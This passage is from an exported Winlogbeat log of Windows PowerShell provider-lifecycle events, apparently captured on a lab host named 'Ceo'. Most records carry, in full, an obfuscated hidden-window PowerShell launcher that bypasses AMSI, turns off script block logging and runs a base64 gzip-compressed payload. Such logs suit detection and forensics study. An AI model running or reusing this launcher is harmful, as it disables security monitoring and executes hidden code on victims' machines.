System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4559,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:43.207",gnkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4560,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:43.207",g3kMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; 